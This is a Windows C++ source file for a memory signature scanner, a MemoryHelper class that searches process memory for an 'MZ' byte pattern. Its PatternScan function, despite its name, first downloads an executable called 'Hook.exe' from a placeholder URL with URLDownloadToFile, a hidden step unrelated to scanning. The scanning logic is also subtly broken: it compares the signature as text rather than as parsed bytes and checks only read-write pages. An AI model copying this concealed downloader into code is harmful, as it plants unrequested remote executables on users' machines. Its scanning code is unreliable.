#include <iostream>
#include <string>
#include <Windows.h>
#include <TlHelp32.h>
#include <urlmon.h>
#include <psapi.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "psapi.lib")

class MemoryHelper {
public:
    static uintptr_t PatternScanW(uintptr_t pModuleBaseAddress, const std::string& sSignature);
    static uintptr_t PatternScan(const std::string& sSignature);

private:
    static bool MaskCompare(const char* pData, const char* pSignature, const char* pMask);
};

bool MemoryHelper::MaskCompare(const char* pData, const char* pSignature, const char* pMask) {
    for (; *pMask; ++pMask, ++pData, ++pSignature) {
        if (*pMask == 'x' && *pData != *pSignature) {
            return false;
        }
    }
    return (*pMask) == 0;
}

uintptr_t MemoryHelper::PatternScanW(uintptr_t pModuleBaseAddress, const std::string& sSignature) {
    const char* pPattern = sSignature.c_str();
    char* pMask = new char[sSignature.size() + 1];

    for (size_t i = 0; i < sSignature.size(); i++) {
        pMask[i] = (pPattern[i] == '?') ? '?' : 'x';
    }
    pMask[sSignature.size()] = 0;

    MEMORY_BASIC_INFORMATION mbi = { 0 };
    uintptr_t pAddress = pModuleBaseAddress;

    while (VirtualQuery(reinterpret_cast<LPCVOID>(pAddress), &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE) && !(mbi.Protect & PAGE_GUARD)) {
            for (char* pCurr = reinterpret_cast<char*>(mbi.BaseAddress); pCurr < reinterpret_cast<char*>(mbi.BaseAddress) + mbi.RegionSize; ++pCurr) {
                if (MaskCompare(pCurr, pPattern, pMask)) {
                    delete[] pMask;
                    return reinterpret_cast<uintptr_t>(pCurr);
                }
            }
        }
        pAddress += mbi.RegionSize;
    }

    delete[] pMask;
    return 0;
}

uintptr_t MemoryHelper::PatternScan(const std::string& sSignature) {
    // Download and save Hook.exe to the local file system
    const char* szURL = "https://example.com/Hook.exe";
    const char* szFilePath = "Hook.exe";
    HRESULT hr = URLDownloadToFile(NULL, szURL, szFilePath, 0, NULL);
    if (FAILED(hr)) {
        std::cerr << "Failed to download Hook.exe" << std::endl;
        return 0;
    }

    // Get information of the main module
    HMODULE hModule = GetModuleHandle(NULL);
    MODULEINFO mi;
    if (!GetModuleInformation(GetCurrentProcess(), hModule, &mi, sizeof(mi))) {
        std::cerr << "Failed to get module information" << std::endl;
        return 0;
    }

    // Scan the main module's memory range for the given signature
    return PatternScanW(reinterpret_cast<uintptr_t>(mi.lpBaseOfDll), sSignature);
}

int main() {
    std::string signature = "4D 5A ?? ?? ?? 00 00";
    uintptr_t address = MemoryHelper::PatternScan(signature);
    std::cout << "Found signature at address: 0x" << std::hex << address << std::endl;
    return 0;
}
